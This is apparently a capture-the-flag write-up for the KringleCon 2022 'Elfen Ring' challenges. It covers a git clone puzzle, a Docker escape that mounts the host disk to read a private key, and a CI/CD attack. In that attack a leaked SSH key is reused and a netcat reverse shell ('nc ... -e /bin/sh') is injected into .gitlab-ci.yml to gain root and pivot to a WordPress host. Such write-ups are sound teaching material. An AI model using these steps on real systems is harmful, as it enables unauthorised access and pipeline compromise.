# Elfen Ring

![700](images/Pasted%20image%2020230104223355.png)
## Clone with a Difference

**Q1. We just need you to clone one repo: git clone git@haugfactory.com:asnowball/aws_scripts.git. This should be easy, right? Thing is: it doesn't seem to be working for me. This is a public repository though. I'm so confused!**

Thought process:
- The elf's command looks to be a mashup of SSL and HTTP, when comparing to the examples in https://git-scm.com/docs/git-clone. 
- SSH should be ruled out because it requires credentials and the question says it is public. 
- GIT, another option in the documentation, is a red herring. Although it doesn't require credentials, the docs say to use it "with caution on unsecured networks" and this is meant to be a public repo. 
- HTTP(S)  is the most likely candidate, with format
`http[s]://host.xz[:port]/path/to/repo.git/`

We need to figure out the host, the path and the file to check out. Host (haugfactory.com) and file (aws_scripts.git) are straightforward. It's just the strings  "git", "asnowball" that we have to play with. After some trial and error, we get:
```git
git clone https://haugfactory.com/asnowball/aws_scripts.git/
```

## Prison Escape

![700](images/Pasted%20image%2020230104223511.png)

**Q1. Escape from a container. Get hints for this challenge from Bow Ninecandle in the Elfen Ring. What hex string appears in the host file `/home/jailer/.ssh/jail.key.priv`?**

It appears we have sudo access, e.g. sudo ls -l. However we are in a jail under /samaways/ with little visibility into anything else. For example:
```shell
grinchum-land:/$ whoami
samways
grinchum-land:~$ ls
grinchum-land:~$ 
```

This URL (recommended on Discord) was very helpful: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation. Working through the options, the most promising one was "Mounting Disk #1" . Per the description, a well configured docker image should not allow "fdisk -l", i.e. listing the partitions on the disk.

Running this command shows we have visibility to sector "vda"
``` shell
grinchum-land:~$ sudo fdisk -l
Disk /dev/vda: 2048 MB, 2147483648 bytes, 4194304 sectors
2048 cylinders, 64 heads, 32 sectors/track
Units: sectors of 1 * 512 = 512 bytes
```

We want to change directory directly into that sector, so we create an arbitrary directory name ('hola') and mount the vda sector to that directory.

``` shell
$ mkdir -p hola
$ sudo mount /dev/vda hola
```


Now, we cd into the directory (really, the sector) and find the world is open.
```shell
grinchum-land:~/hola$ ls
bin   dev  home  lib32  libx32      media  opt   root  sbin  sys  usr
boot  etc  lib   lib64  lost+found  mnt    proc  run   srv   tmp  var
```


Per instructions, we are to look for the hex string that appears in the host file /home/jailer/.ssh/jail.key.priv. We find and read the file
`grinchum-land: ~/hola$ cat home/jailer/.ssh/jail.key.priv` 

And it gives us the key    *082bb339ec19de4935867*

## Jolly CI/CD 

![700](images/Pasted%20image%2020230104223618.png)

### Hold Your Horses
When we enter, we are told the environment can take 5 minutes to start up. Use the following command to wait until you see the server up:
```shell
$ watch ping gitlab.flag.net.internal
PING gitlab.flag.net.internal (172.18.0.150): 56 data bytes
64 bytes from 172.18.0.150: seq=0 ttl=42 time=0.081 ms
```

While waiting, you can familiarize with tmux to split panes and switch between them - it will be useful: https://linuxize.com/post/getting-started-with-tmux/. In particular:
- **tmux**: create a new terminal
- (Ctrl-B) splits panes horizontally
- (Ctrl-B-o) toggle active pane

### Git a Clue
A clue from Tinsel was: "WHOOPS! I didn’t mean to commit that to http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git..." so of course we want to look at that commit.
```shell
$ git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal
$ cd wordpress.flag.net.internal
$ git log
```

git log shows a commit # for the whoops commit, which we can examine with git diff:
```shell
commit e19f653bde9ea3de6af21a587e41e7a909db1ca5
Author: knee-oh <sporx@kringlecon.com>

$ git diff e19f653bde9ea3de6af21a587e41e7a909db1ca5~ 
------BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
-QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5
-9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g
-AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot
-PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
------END OPENSSH PRIVATE KEY-----
...
-ssh-ed25519 ...  sporx@kringlecon.com'
```
So apparently the elf committed a private key. Looking up ssh-ed25519, it turns out to be  a protocol for public keys https://datatracker.ietf.org/doc/id/draft-ietf-curdle-ssh-ed25519-02.xml.

### Key Business

A private key is a handy thing to have, so we go through the process of using it - we need to set up the private key files, and generating the corresponding public key too. Helpful links:
- https://medium.com/@pyssion5/git-ssh-configuration-once-and-for-all-3a5f2b579315 
- https://linuxize.com/post/using-the-ssh-config-file/ 
- https://mokacoding.com/blog/how-to-verify-ssh-key-password/
- https://blog.tinned-software.net/generate-public-ssh-key-from-private-ssh-key/
```bash
mkdir ~/.ssh
# create config file
echo 'Host gitlab.flag.net.internal
    HostName gitlab.flag.net.internal
    IdentityFile ~/.ssh/id_ed25519' > ~/.ssh/config
# Make key
echo '-----BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
-QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5
-9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g
-AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot
-PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
-----END OPENSSH PRIVATE KEY-----'  > ~/.ssh/id_ed25519
# Change the perms because it will only accept self-readable key
sudo chmod 600 ~/.ssh/id_ed25519 
# Verify it, it should show sporx@kringlecon.com
ssh-keygen -y -f ~/.ssh/id_ed25519
# Created public key for the private key so we can use it to login.
ssh-keygen -t ed2551 -y -f ~/.ssh/id_ed25519 > ~/.ssh/id_ed25519.pub
```

We now have a private/public key pair and gitlab. That reminds us that ssh is a valid option for git, so we check GitLab's reference (https://docs.gitlab.com/ee/gitlab-basics/start-using-git.html#clone-with-ssh) and clone the repo into another directory, (elf-ssh).
```bash
git clone git@gitlab.flag.net.internal:rings-of-powder/wordpress.flag.net.internal elf-ssh
cd elf-ssh
```
### SSH.. I Heard There is a Back CI/CDoor
Having a ssh-git connection gives us more power because we can now run actions, e.g. commits, with accepted credentials as opposed to just reading the code. Let's see what is kicked off by CI/CD when we commit - look at .gitlab.ci.yml (a hidden file at the root of the repo).
```shell
$ cat ~/elf-ssh/.gitlab-ci.yml

stages:
  - deploy

deploy-job:      
  stage: deploy 
  environment: production
  script:
    - rsync -e "ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy" --chown=www-data:www-data -atv --delete --progress ./ root@wordpress.flag.net.internal:/var/www/html
```
The script looks super interesting - from https://docs.gitlab.com/ee/ci/yaml/gitlab_ci_yaml.htm and https://www.educba.com/linux-rsync/ it looks like deployment kicks off a process to rsync (remote sync) and create a remote shell (-e) with the ssh command, using root (Did someone say ROOT? Red alert!).

We definitely want to sneak into that process running as root, so we will have to modify the yaml.  We set git up to sign our commits with the ssh key, using https://calebhearth.com/sign-git-with-ssh  and test an empty commit.
```git
git config --global user.email "sporx@kringlecon.com"
git config --global user.name "knee-oh"
git commit --allow-empty --message="Testing SSH signing"
```
Our plan of attack is to park a listener on our server, and create a reverse shell during CI/CD deployment that will connect with our listener. At this point, if we haven't yet created another terminal and split the panes, do so (run tmux, then Ctrl-B-""). 

In one of the panes, run Netcat as listener:
```bash
# shows eth0 172.18.0.99 
ifconfig
#run our listener
nc -lvp 5050
```

In the other pane. edit the .gitlab--ci.yml and add a new line to launch netcat with a reverse shell to our listener's address and port:
```yaml
rsync 
-e "ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy" --chown=www-data:www-data -atv --delete --progress ./ root@wordpress.flag.net.internal:/var/www/html  
- "nc 172.18.0.99 5050 -e /bin/sh"
```
Commit our changes to kick off the deployment. I like to use allow-empty flag in case I mess up and I can re-deploy by touching and recommitting the yml file.
```git
git add .gitlab-ci.yml
git commit --message="Reverse Shell" --allow-empty
git push

```
Now, sit and wait. THIS CAN TAKE A MINUTE OR TWO, but we are rewarded with a message on the listener that a connection was received.
![cicd-terms](images/cicd-terms.jpg)

### Rooting for the Flag

Running whoami and hostname on the listener shows that we are 'root' on 'gitlab-runner.flag.net.internal'. The challenge says to get to their web deployment. Looking again at the yaml, we see that deploy runs a ssh command to a wordpress server. We copy that, clean it up slightly and run it on our listener's shell.
`ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy root@wordpress.flag.net.internal`

That gets us into wordpress.flag.net  (we are now two shells deep, if anyone's counting). We go to the root, and poke around.. bingo, flag.txt! 
```bash
cd /
ls
cat flag.txt
```

That gives us the flag *oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT*  and we are done with the Elfen Ring. 
![200](images/ElvenRing_gold.jpg)

Jump to: [KringleCon 2022 Orientation](KringleCon%202022%20Orientation.md) | [Tolkien Ring](Tolkien%20Ring.md) | Elfen Ring | [Web Ring](Web%20Ring.md)| [Cloud Ring](Cloud%20Ring.md)|[](#Burning%20Ring%20of%20Fire.md)| [](#%20KringleCon%202022%20Wrap-up.md)